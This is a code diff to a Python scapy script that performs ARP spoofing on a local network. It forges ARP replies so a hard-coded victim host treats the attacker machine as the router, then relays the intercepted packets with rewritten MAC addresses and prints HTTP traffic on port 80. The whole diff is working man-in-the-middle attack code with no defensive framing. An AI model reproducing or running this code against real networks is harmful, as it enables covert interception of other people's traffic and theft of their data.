@@ -18,7 +18,7 @@ from user import *
 
 
 # global variables:
-localAddresses=['10.30.58.219']
+localAddresses=['192.168.1.29']
 addressesLock=Lock()
 gatewayMAC=''
 bad_packet=[]
@@ -64,8 +64,19 @@ def handle_Packet(pkt):
 
     if ARP not in pkt:
         if Ether in pkt:
-            if pkt[Ether].src !=gatewayMAC:
+            if pkt[Ether].src ==gatewayMAC:
+                if IP in pkt:
+                    if pkt[IP] != localHost:
+                        pkt[Ether].src="08:00:27:83:79:0b"
+                        sendp(pkt,verbose=0)
+            else:
                 functions.sendPacket(pkt,gatewayMAC)
+            if TCP in pkt:
+                if pkt[TCP].dport==80:
+                    print 'sent:',pkt.summary()
+            #else:
+                #if pkt[IP].dst != localHost:
+                    #pkt.show()
     """url=None
     if ARP not in pkt:
         if TCP in pkt:
@@ -140,6 +151,7 @@ def arpSpoof(router):
     """
     every 30 seconds send ARP broadcast to spoof all machines on LAN
     """
+    print 'router:',router
     while True:
 
         if len(localAddresses)>0:
@@ -147,15 +159,15 @@ def arpSpoof(router):
             #print 'spoofing',str(len(localAddresses)), localAddresses
             for host in localAddresses :
                 #if host != localHost:
-                if host=='10.30.58.219':
-                    print 'spoofing',host
-                    victimPacket = Ether(dst='70:5a:0f:47:d3:af')/ARP(op=2,psrc = router, pdst=host,hwdst='70:5a:0f:47:d3:af',hwsrc='08:00:27:f9:94:1b')#create arp packets
+                if host=='192.168.1.29':
+                    #print 'spoofing',host
+                    victimPacket =ARP(op=2,psrc = router, pdst=host,hwdst='ff:ff:ff:ff:ff:ff')#create arp packets (whdst doesn't matter can be broadcast or specific)
                     #packet needs to have MAC addresses
                     #gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                     logging.debug('spoofing: '+victimPacket[ARP].pdst)
-                    sendp(victimPacket,verbose=0)#send packets
+                    send(victimPacket,verbose=0)#send packets
                     #sendp(gatewayPacket,verbose=0)
-
+                    #8c:7c:5a:84:68:20
             addressesLock.release()
             #print 'done spoofing'
             #sleep(3)
